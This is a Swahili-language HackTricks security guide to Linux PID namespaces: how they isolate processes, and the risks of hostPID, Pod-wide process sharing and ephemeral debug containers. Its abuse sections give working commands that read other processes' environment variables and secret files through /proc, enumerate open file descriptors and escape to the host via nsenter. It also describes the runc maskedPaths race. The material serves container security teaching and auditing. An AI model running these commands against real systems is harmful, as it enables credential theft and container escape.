# PID Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Muhtasari

PID namespace hudhibiti jinsi michakato inavyopangiwa nambari na ni michakato ipi inayoonekana. Ndiyo maana container inaweza kuwa na PID 1 yake hata ingawa si mashine halisi. Ndani ya namespace, workload huona kile kinachoonekana kama mti wa michakato wa ndani. Nje ya namespace, host bado huona PID halisi za host na mandhari kamili ya michakato.<sup>[[3]](#references)</sup>

Kwa mtazamo wa usalama, PID namespace ni muhimu kwa sababu mwonekano wa michakato una thamani. Workload inapoweza kuona michakato ya host, inaweza kuweza kuona majina ya huduma, hoja za command line, siri zilizopitishwa kwenye hoja za michakato, hali inayotokana na mazingira kupitia `/proc`, na michakato inayoweza kulengwa kwa kuingia kwenye namespace. Ikiwa inaweza kufanya zaidi ya kuona tu michakato hiyo, kwa mfano kutuma signals au kutumia ptrace chini ya masharti yanayofaa, tatizo huwa kubwa zaidi.

## Uendeshaji

PID namespace mpya huanza na mpangilio wake wa ndani wa nambari za michakato. Mchakato wa kwanza unaoundwa ndani yake huwa PID 1 kwa mtazamo wa namespace hiyo, jambo linalomaanisha pia kwamba hupata semantiki maalum za aina ya init kwa watoto yatima na tabia ya signals. Hii hufafanua mambo mengi yasiyo ya kawaida katika container kuhusu michakato ya init, ukusanyaji wa zombie, na kwa nini wakati mwingine wrappers ndogo za init hutumiwa kwenye container.<sup>[[3]](#references)</sup>

PID namespaces hupangwa kwa ngazi. Mchakato katika namespace ya mzazi unaweza kufikia michakato ya namespace za vizazi kwa kutumia PID iliyopewa katika namespace hiyo ya mzazi, lakini mchakato wa namespace ya kizazi hauwezi kufikia michakato ya mzazi pekee kupitia syscalls za kawaida zinazotumia PID au kuingia kwenye PID namespace ya mzazi kwa kutumia `setns()`. procfs inayomilikiwa na mzazi na kufichuliwa kimakusudi kwa namespace ya kizazi bado inaweza kuvuja mwonekano wa michakato ya mzazi. Pia, kujiunga na PID namespace kwa kutumia `setns()` hubadilisha namespace kwa **watoto wa baadaye**, si kwa mchakato wenyewe; kwa hiyo zana huunda fork baada ya kujiunga. Mount ya procfs huhifadhi mwonekano wa PID wa mchakato ulioi-mount, ndiyo maana kuunda procfs mpya baada ya `unshare(CLONE_NEWPID)` ni muhimu kwa usalama, si kwa mwonekano tu.<sup>[[3]](#references)</sup>

Somo muhimu la usalama ni kwamba mchakato unaweza kuonekana umetengwa kwa sababu unaona mti wake wa PID pekee, lakini utengaji huo unaweza kuondolewa kimakusudi. Docker hutoa kipengele hiki kupitia `--pid=host`, ilhali Kubernetes hufanya hivyo kupitia `hostPID: true`. Container inapojiunga na PID namespace ya host, workload huona michakato ya host moja kwa moja, na njia nyingi za mashambulizi zinazofuata huwa za uwezekano mkubwa zaidi.

## Maabara

Kuunda PID namespace mwenyewe:

```bash
sudo unshare --pid --fork --mount-proc bash
ps -ef
echo $$
```

Shell sasa inaona mwonekano wa faragha wa michakato. Alama ya `--mount-proc` ni muhimu kwa sababu huweka instance ya procfs inayolingana na PID namespace mpya, na kufanya orodha ya michakato iwe na mshikamano kutoka ndani.<sup>[[3]](#references)</sup>

Ili kulinganisha tabia ya container:

```bash
docker run --rm debian:stable-slim ps -ef
docker run --rm --pid=host debian:stable-slim ps -ef | head
```

Tofauti inaonekana mara moja na ni rahisi kuelewa, ndiyo maana hili ni jaribio la kwanza zuri kwa wasomaji.

## Matumizi wakati wa Runtime

Containers za kawaida katika Docker, Podman, containerd, na CRI-O hupata PID namespace yao wenyewe. Containers za Kubernetes kwa kawaida huwa na mwonekano tofauti wa PID; `shareProcessNamespace: true` huunda kimakusudi mwonekano mmoja wa Pod nzima.<sup>[[4]](#references)</sup> Kinyume chake, `hostPID: true` huchagua PID namespace ya node. Mazingira ya LXC/Incus hutegemea primitive ileile ya kernel, ingawa matumizi ya system-container yanaweza kufichua miti changamano zaidi ya process na kuhimiza njia za mkato zaidi za debugging.

Kanuni hiyo hiyo inatumika kila mahali: ikiwa runtime iliamua kutenga PID namespace, basi hilo ni punguzo la kimakusudi la mipaka ya container.

## Mipangilio isiyo sahihi

Mipangilio isiyo sahihi inayojulikana zaidi ni kushiriki PID za host. Timu mara nyingi huhalalisha hili kwa urahisi wa debugging, monitoring, au usimamizi wa huduma, lakini linapaswa kuchukuliwa kila wakati kama hali ya kiusalama isiyo ya kawaida yenye athari kubwa. Hata kama container haina njia ya moja kwa moja ya kuandika kwenye processes za host, mwonekano pekee unaweza kufichua mengi kuhusu mfumo. Mara tu capabilities kama `CAP_SYS_PTRACE` au ufikiaji muhimu wa procfs zinapoongezwa, hatari huongezeka sana.

Kosa jingine ni kudhani kwamba kwa sababu workload haiwezi kuua au kutumia ptrace kwenye processes za host kwa chaguomsingi, basi kushiriki PID za host hakuna madhara. Hitimisho hilo linapuuza thamani ya uchunguzi wa mifumo, upatikanaji wa targets za kuingia kwenye namespace, na jinsi mwonekano wa PID unavyoungana na vidhibiti vingine vilivyodhoofishwa.

### Kushiriki processes katika Pod nzima ya Kubernetes

`shareProcessNamespace: true` ni tofauti na `hostPID`: hufichua processes za **containers nyingine zilizo katika Pod hiyo hiyo**, si processes za node. Kisha sidecar au debug container iliyoathiriwa inaweza kuchunguza command lines na data ya mazingira ya containers jirani kwa kuzingatia ukaguzi wa ufikiaji wa procfs, kutuma signals wakati credentials zinaruhusu, na kupitia filesystem ya container jirani kupitia `/proc/<pid>/root`. Kubernetes inaonya wazi kwamba siri zilizo kwenye command line/environment na filesystem za containers hulindwa tu na ruhusa husika za Unix.<sup>[[4]](#references)</sup>

Ukaguzi muhimu upande wa cluster:

```bash
kubectl get pods -A -o json | jq -r '
  .items[] |
  select(.spec.hostPID == true or .spec.shareProcessNamespace == true) |
  [.metadata.namespace,.metadata.name,
   (.spec.hostPID // false),(.spec.shareProcessNamespace // false)] | @tsv'
```

Kutoka kwenye kontena lililoathiriwa katika Pod-wide PID namespace, kwanza jaribu ufikiaji halisi badala ya kudhani kwamba kuonekana kunamaanisha kusomeka:<sup>[[4]](#references)</sup>

```bash
victim=$(ps -eo pid,args | awk '/[n]ginx|[j]ava|[p]ython/{print $1; exit}')
[ -n "$victim" ] || { echo "No candidate process found"; exit 1; }
tr '\0' ' ' < "/proc/$victim/cmdline" 2>/dev/null; echo
tr '\0' '\n' < "/proc/$victim/environ" 2>/dev/null | sed -n '1,20p'
find "/proc/$victim/root/run/secrets" -maxdepth 2 -type f -ls 2>/dev/null
```

### Kontena za muda mfupi zilizolengwa katika Pod iliyopo ya Kubernetes

Utambulisho wa Kubernetes unaoruhusiwa kurekebisha `pods/ephemeralcontainers` unaweza kuongeza debugger kwenye Pod inayoendeshwa hata kama `shareProcessNamespace` haijawekwa. Kwa kutumia `--target`, debugger hujiunga na process namespace ya kontena lililotajwa ikiwa runtime inaunga mkono ulengaji wa namespace. Hii huonyesha michakato ya kontena hilo, si namespace ya PID ya host ya node.<sup>[[5]](#references)</sup>

API hutumia subresource tofauti, kwa hivyo kagua ruhusa zake za `patch`/`update` badala ya kudhani kuwa ruhusa za kawaida za kuandika Pod zinajumuisha hizo.<sup>[[6]](#references)</sup>

Kwa Pod na kontena ndani ya namespace iliyoidhinishwa, jaribu mwonekano unaolengwa:<sup>[[5]](#references)[[6]](#references)</sup>

```bash
ns=default; pod=myapp; container=app
kubectl auth can-i get pods -n "$ns"
kubectl auth can-i patch pods/ephemeralcontainers -n "$ns"
kubectl auth can-i update pods/ephemeralcontainers -n "$ns"
kubectl auth can-i create pods/attach -n "$ns"
kubectl -n "$ns" debug -it "pod/$pod" --image=busybox:1.36 --target="$container" -- sh
# In the debug shell: verify the target processes are actually visible.
ps -ef
```

Ikiwa runtime haitumii targeting, debugger inaweza kushindwa kuanza au kubaki kwenye PID namespace iliyotengwa.<sup>[[5]](#references)</sup> Ikiwa targeting inafanya kazi, tumia ukaguzi ulio chini ya [Kubernetes Pod-wide process sharing](#kubernetes-pod-wide-process-sharing) ili kujaribu ufikiaji wa `/proc/<pid>`. Kuona mchakato hakumaanishi una ruhusa ya kusoma siri za target au kuitumia signal: Unix credentials na ukaguzi wa ufikiaji wa procfs bado hutumika.<sup>[[4]](#references)[[8]](#references)</sup> Pod Security Standards pia huweka vikwazo kwa mipangilio yenye upendeleo kwenye ephemeral containers.<sup>[[7]](#references)</sup>

## Abuse

Ikiwa host PID namespace inashirikiwa, mshambuliaji anaweza kukagua michakato ya host, kukusanya hoja za michakato, kutambua huduma zinazovutia, kupata PIDs zinazoweza kutumika kwa `nsenter`, au kuchanganya uwezo wa kuona michakato na mamlaka yanayohusiana na ptrace ili kuingilia shughuli za host au workloads jirani. Katika baadhi ya hali, kuona tu mchakato sahihi unaoendelea kwa muda mrefu kunatosha kubadili mpango mzima wa shambulio.

Hatua ya kwanza ya vitendo ni kuthibitisha kila wakati kwamba michakato ya host inaonekana kweli:

```bash
readlink /proc/self/ns/pid
ps -ef | head -n 50
ls /proc | grep '^[0-9]' | head -n 20
```

Mara tu PIDs za host zinapoonekana, argument za process na targets za kuingia kwenye namespace mara nyingi huwa vyanzo muhimu zaidi vya taarifa:

```bash
for p in 1 $(pgrep -n systemd 2>/dev/null) $(pgrep -n dockerd 2>/dev/null); do
  echo "PID=$p"
  tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null; echo
done
```

Ikiwa `nsenter` inapatikana na kuna ruhusa za kutosha, jaribu ikiwa mchakato wa host unaoonekana unaweza kutumika kama daraja la namespace:

```bash
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "nsenter blocked"
```

Hata kuingia kukizuiwa, kushiriki PID za host tayari kuna manufaa kwa sababu hufichua mpangilio wa huduma, vipengele vya runtime, na michakato inayoweza kuwa na privileged ambayo inaweza kulengwa baadaye. Kuona PID pekee **hak**ukupi ruhusa ya kutuma signal, kufuatilia, kusoma maingizo nyeti ya `/proc/<pid>`, au kujiunga na namespaces nyingine za target; credentials, dumpability, capabilities katika user namespace inayomiliki namespace ya target, sera za Yama/LSM, na seccomp bado ni muhimu.<sup>[[3]](#references)</sup> Tazama [CAP_SYS_PTRACE](../../../../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace) kwa mifano ya process-injection.

Kuona PID za host pia hufanya matumizi mabaya ya file descriptor yawezekane zaidi. Ikiwa process yenye privileged ya host au workload iliyo jirani ina faili nyeti au socket iliyofunguliwa, mshambuliaji anaweza kuweza kukagua `/proc/<pid>/fd/` na kufikia object husika, kutegemea ukaguzi wa aina ya ptrace, umiliki, chaguo za mount za procfs, aina ya object, na muundo wa huduma lengwa. Kuona symlink ya FD pekee hakumaanishi kuwa inaweza kufunguliwa, na socket haiwezi kunakiliwa kwa kufungua tu symlink yake ya `/proc/<pid>/fd/N`. Kwa primitive tofauti ya `pidfd_getfd()` na ukaguzi wake wa uidhinishaji, tazama [Linux ptrace exit-race pidfd FD theft](../../../../main-system-information/kernel-lpe-cves/linux-ptrace-exit-race-pidfd_getfd-fd-theft.md).<sup>[[3]](#references)</sup>

```bash
for fd_dir in /proc/[0-9]*/fd; do
  ls -l "$fd_dir" 2>/dev/null | sed "s|^|$fd_dir -> |"
done
grep " /proc " /proc/mounts
```

Amri hizi ni muhimu kwa sababu zinaonyesha ikiwa `hidepid=1` au `hidepid=2` inapunguza mwonekano kati ya michakato na ikiwa descriptors zinazoonekana kuwa za kuvutia, kama vile faili za siri zilizo wazi, logi au Unix sockets, zinaonekana kabisa.

### Mfano Kamili: host PID + `nsenter`

Kushiriki PID ya host kunaweza kuwezesha host escape ikiwa mchakato una capabilities zinazohitajika kujiunga na namespaces za host na kutumia root ya mchakato wa host. `nsenter --root` (`-r`) inahitajika kwa hilo: kubadilisha mount namespace pekee hakubadilishi saraka ya root ya caller.<sup>[[9]](#references)</sup> Kufikia `/proc/1/root` kunahitaji kupita ukaguzi wa ptrace wa kusoma, huku kubadilisha root kukihitaji `CAP_SYS_CHROOT` katika user namespace ya caller.<sup>[[8]](#references)[[10]](#references)</sup>

```bash
ps -ef | head -n 50
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh
```

Ikiwa amri itafaulu, shell mpya itatumia namespaces za mount, UTS, network, IPC na PID za host pamoja na mfumo wa faili wa root wa PID 1. Kagua utambulisho na ruhusa zinazotumika badala ya kudhani kuwa kuona PID pekee kumekupa mamlaka ya host.<sup>[[9]](#references)</sup>

Hata kama `nsenter` yenyewe haipo, huenda matokeo hayo hayo yakapatikana kupitia binary ya host ikiwa mfumo wa faili wa host umewekwa mount:

```bash
/host/usr/bin/nsenter -t 1 -m -u -n -i -p -r -W / -- /bin/sh 2>/dev/null
```

### Vidokezo vya Hivi Karibuni vya Runtime

Baadhi ya mashambulizi yanayohusiana na PID namespace si usanidi mbaya wa jadi wa `hostPID: true`, bali ni hitilafu za utekelezaji wa runtime kuhusu jinsi ulinzi wa procfs unavyotumika wakati wa kusanidi kontena.

#### `maskedPaths` race hadi host procfs

Katika matoleo ya `runc` yaliyo hatarini, washambuliaji wanaoweza kudhibiti image ya kontena au workload ya `runc exec` wanaweza kutumia race wakati wa hatua ya masking kwa kubadilisha `/dev/null` iliyo upande wa kontena kuwa symlink inayoelekeza kwenye njia nyeti ya procfs, kama vile `/proc/sys/kernel/core_pattern`. Race ikifaulu, bind mount ya masked-path inaweza kuwekwa kwenye lengo lisilo sahihi na kufichua vidhibiti vya procfs vya host-global kwa kontena jipya.<sup>[[1]](#references)</sup>

Amri muhimu ya ukaguzi:

```bash
jq '.linux.maskedPaths' config.json 2>/dev/null
```

Hili ni muhimu kwa sababu athari ya mwisho inaweza kuwa sawa na kufichuliwa moja kwa moja kwa procfs: `core_pattern` au `sysrq-trigger` inayoweza kuandikwa, kisha utekelezaji wa msimbo kwenye host au kunyimwa huduma. Kurasa maalum za [masked paths](../masked-paths.md) na [sensitive host mounts](../../sensitive-host-mounts.md) zinaeleza eneo la jumla la mashambulizi ya procfs bila kurudia maelezo hapa.

#### Uingizaji wa namespace kwa kutumia `insject`

Zana za kuingiza kwenye namespace kama vile `insject` zinaonyesha kuwa mwingiliano na PID namespace hauhitaji kila mara kuingia kwenye namespace lengwa kabla ya kuunda mchakato. Msaidizi anaweza kujiunga baadaye, kutumia `setns()`, na kutekeleza huku akidumisha uwezo wa kuona nafasi ya PID lengwa:<sup>[[2]](#references)</sup>

```bash
sudo insject -S -p $(pidof containerd-shim) -- bash -lc 'readlink /proc/self/ns/pid && ps -ef'
```

Aina hii ya mbinu ni muhimu hasa katika utatuzi wa hitilafu wa hali ya juu, zana za offensive, na workflows za post-exploitation, ambapo muktadha wa namespace lazima uunganishwe baada ya runtime kuwa tayari imeanzisha workload.

### Miundo Husika ya Matumizi Mabaya ya FD

Miundo miwili inafaa kutajwa waziwazi wakati PIDs za host zinaonekana. Kwanza, mchakato wenye ruhusa za juu unaweza kuacha file descriptor nyeti ikiwa wazi wakati wa `execve()` kwa sababu haikuwekewa alama ya `O_CLOEXEC`. Pili, huduma zinaweza kupitisha file descriptors kupitia Unix sockets kwa kutumia `SCM_RIGHTS`. Katika hali zote mbili, kitu muhimu si tena pathname, bali ni handle ambayo tayari imefunguliwa na ambayo mchakato wenye ruhusa za chini unaweza kurithi au kupokea.

Hili ni muhimu katika kazi za container kwa sababu handle inaweza kuelekeza kwenye `docker.sock`, logi yenye ruhusa za juu, faili ya siri ya host, au kitu kingine chenye thamani kubwa, hata kama njia ya faili yenyewe haifikiwi moja kwa moja kutoka kwenye filesystem ya container.

## Ukaguzi

Madhumuni ya amri hizi ni kubaini ikiwa mchakato una mwonekano binafsi wa PID au ikiwa tayari unaweza kuorodhesha mandhari pana zaidi ya michakato.

```bash
readlink /proc/self/ns/{pid,pid_for_children,user,mnt}
grep -E '^(Name|Pid|PPid|NSpid|Uid|Gid|TracerPid):' /proc/self/status
ps -ef | head
findmnt -no TARGET,FSTYPE,OPTIONS /proc
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
capsh --print 2>/dev/null | grep -E 'Current:|Bounding'
```

Ni nini kinachovutia hapa:<sup>[[3]](#references)</sup>

- Ikiwa orodha ya michakato ina huduma za host zinazoonekana wazi, huenda ushirikishaji wa PID za host tayari umewezeshwa.
- Kuona tu mti mdogo wa ndani ya container ndiyo hali ya kawaida; kuona `systemd`, `dockerd`, au daemon zisizohusiana si kawaida.
- `NSpid` inaweza kufichua ulinganifu wa PID katika namespaces zilizopachikwa. Thamani iliyo kushoto kabisa inahusiana na PID namespace iliyohusishwa na mount ya procfs, ikifuatiwa na thamani za namespaces zinazopachikwa mfululizo.
- `readlink /proc/self/ns/pid` peke yake haiwezi kuthibitisha `hostPID`: container iliyotengwa pia ina inode halali ya PID namespace. Linganisha na orodha ya michakato, mount ya procfs, usanidi wa runtime, na inode ya namespace upande wa host inapopatikana.
- Mara tu PID za host zinapoonekana, hata taarifa za michakato za kusoma tu huwa muhimu kwa reconnaissance.

Ukigundua container inayoendesha kwa kushiriki PID za host, usichukulie hili kama tofauti ya mwonekano tu. Hili ni badiliko kubwa katika kile ambacho workload inaweza kuona na huenda kikaathiri.





## References

- [1] [Ushauri wa usalama wa runc: kutoroka kutoka kwa container kupitia matumizi mabaya ya "masked path" kutokana na hali za race za mount (CVE-2025-31133)](https://github.com/opencontainers/runc/security/advisories/GHSA-9493-h29p-rfm2)
- [2] [Toleo la zana – insject: Kichomezi cha Linux Namespace](https://www.nccgroup.com/research-blog/tool-release-insject-a-linux-namespace-injector/)
- [3] [Kitabu cha Linux man-pages 6.19](https://www.kernel.org/pub/linux/docs/man-pages/book/man-pages-6.19.pdf)
- [4] [Shiriki Process Namespace kati ya Containers katika Pod](https://kubernetes.io/docs/tasks/configure-pod-container/share-process-namespace/)
- [5] [Utatuzi wa Pods Zinazoendesha](https://kubernetes.io/docs/tasks/debug/debug-application/debug-running-pod/)
- [6] [KEP ya Ephemeral Containers](https://www.kubernetes.dev/resources/keps/277/)
- [7] [Viwango vya Usalama wa Pod](https://kubernetes.io/docs/concepts/security/pod-security-standards/)
- [8] [proc_pid_root(5)](https://man7.org/linux/man-pages/man5/proc_pid_root.5.html)
- [9] [nsenter(1)](https://man7.org/linux/man-pages/man1/nsenter.1.html)
- [10] [chroot(2)](https://man7.org/linux/man-pages/man2/chroot.2.html)
{{#include ../../../../../banners/hacktricks-training.md}}
